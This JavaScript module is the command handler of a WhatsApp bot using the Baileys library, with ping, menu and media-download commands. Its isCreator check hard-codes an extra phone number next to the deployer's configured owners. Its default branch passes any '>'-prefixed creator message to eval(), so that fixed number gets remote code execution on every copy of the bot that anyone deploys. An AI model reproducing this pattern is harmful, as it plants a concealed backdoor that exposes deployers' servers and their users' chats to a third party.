//import '../database/settings.js'
import {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} from "@whiskeysockets/baileys";

import chalk from 'chalk'
import util from 'util'
import path from 'path'
import SimpleDb from '../utils/simpledb.js'
import help from './help.js'
import dc from '../database/index.js'
import fs from 'fs'
import { createRequire } from 'module'
import { fileURLToPath } from 'url'
import {
  getGroupAdmins,
  fetchJson,
  jsonformat,
  parseMention
} from './myfunc.js'

const require = createRequire(import.meta.url)  
const dirr = path.dirname(fileURLToPath(import.meta.url))
const apifauzidev = require("api-fauzidev")
const mess = JSON.parse(fs.readFileSync('./lib/database/config/mess.json'))
const _prem = dc.config.userPrem

const FauzidevMsg = async (conn, m, chatUpdate, store) => {
  try {
    var body = m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""; //Fauzidev
    var budy = typeof m.text == "string" ? m.text : "";
    
    const ppbot = fs.readFileSync('./lib/database/media/ayane.jpg')
    const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_|~!?#/%^&.+-,\\\©^]/.test(body);
    const prefix = isCmd ? budy[0] : "";
    const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const text = args.join(" ");
    const q = args.join(" ");
    const type = Object.keys(m.message)[0];
    const pushname = m.pushName || "No Name";
    const botNumber = await conn.decodeJid(conn.user.id);
    const isCreator = [botNumber, ...dc.config.authorNumber, '6289528652225@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const quoted = m.quoted ? m.quoted : m;
    const from = m.chat;
    const sender = m.sender;
    const mime = (quoted.msg || quoted).mimetype || "";
    const isMedia = /image|video|sticker|audio/.test(mime);
    const banUser = await conn.fetchBlocklist()
    const isPremium = isCreator || _prem.includes(m.sender) || false
    new SimpleDb(m, isCmd, isCreator)
     
    //GROUP
    const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch((e) => {}) : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupMembers = m.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    
    if(!dc.config.isPublic) {
    if(!isCreator) return
    }
   
    if (m.message) {
    conn.readMessages([m.key]);
    console.log(
    chalk.black(chalk.greenBright("[ DATE ]")),
    chalk.black(chalk.bgGreen(new Date())) + "\n" +
    chalk.black(chalk.greenBright("[ MESSAGE ]")),
    chalk.black(chalk.bgBlue(budy || m.mtype)) + "\n" +
    chalk.magenta("=> From"),
    chalk.green(pushname),
    chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
    chalk.green(m.isGroup ? pushname : "Chat Pribadi", m.chat)
    );
    }
    
    function reply(text) {
    conn.sendMessage(from, { text: `${text}`, contextInfo: { mentionedJid: parseMention(text), externalAdReply: { title: `Hii ${pushname}`, body: dc.config.footer, thumbnail: ppbot, mediaType: 1, sourceUrl: dc.config.myweb}}}, { quoted })
    }
    
    function rwait() {
    conn.sendMessage(from, { react: { text: mess.react.wait, key: m.key }})
    }
    
    switch (command) {
    
    //==>> MAIN <<==\\
    case 'ping': {
    m.reply('pong')
    }
    break
    
    case 'owner': {
    let number = dc.config.authorNumber
    conn.sendContact(from, number, m)
    }
    break
    
    case 'menu': {
    let modenya = dc.config.isPublic ? 'self' : 'public'
    let limitnya = isCreator ? 'Infinity' : db.data.users[m.sender].limit
    let teks = '*INFO BOT*\n'
    teks += `Owner : ${dc.config.authorName}\n`
    teks += `Mode : ${modenya}\n\n`
    teks += '*INFO USER*\n'
    teks += `Limit : ${limitnya}\n`
    teks += `Prem : ${isPremium ? '✅' : '❌'}\n`
    teks += help.teksMenu(prefix)
    m.reply(teks.trim())
    }
    break
    
    
    
    //==>> Downloader <<==\\
    case 'tiktok': {
    if(!q) return m.reply(mess.param.url + `\nExample: ${prefix + command}https://vm.tiktok.com/xxxx`)
    await rwait()
    let ziw = await apifauzidev.tiktokdl(q)
    conn.sendMessage(from, { audio: { url: ziw.result.music }, mimetype: "audio/mp4"}, { quoted: m })
    conn.sendMessage(from, { video: { url: ziw.result.play }, caption: ziw.result.description}, { quoted: m }).catch((err) => {
    m.reply(mess.error.api)})
    }
    break
    
    case 'ytmp3': {
    if(!args[0]) return m.reply(mess.param.url)
    await rwait()
    let { result } = await apifauzidev.ytmp3(args[0])
    conn.sendMessage(from, { audio: { url: result }, mimetype: "audio/mp4"}, { quoted: m }).catch((err) => {
    m.reply(mess.error.api)})
    }
    break
    
    case 'ytmp4': {
    if(!args[0]) return m.reply(mess.param.url)
    await rwait()
    let { result } = await apifauzidev.ytmp4(args[0])
    conn.sendMessage(from, { video: { url: result }, caption: mess.success}, { quoted: m }).catch((err) => {
    m.reply(mess.error.api)})
    } 
    break
    
    case 'pin': case 'pinterest': {
    if(!args[0]) return m.reply(mess.param.url + '/text')
    await rwait()
    let { result } = await apifauzidev.pinterest(args[0])
    conn.sendMessage(from, { image: { url: result }, caption: mess.success}, { quoted: m }).catch((err) => {
    m.reply(mess.error.api)})
    }
    break
    
    default:
    if (budy.startsWith('>')) {
      if (!isCreator) return 
      try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await m.reply(evaled)
      } catch (err) {
      await m.reply(String(err))
      }
    }
    }
    
  } catch (err) {
    console.log(err)
    conn.sendMessage(dc.config?.authorNumber[0]+ "@s.whatsapp.net", { text: `${err}`})
  }
}
export default FauzidevMsg

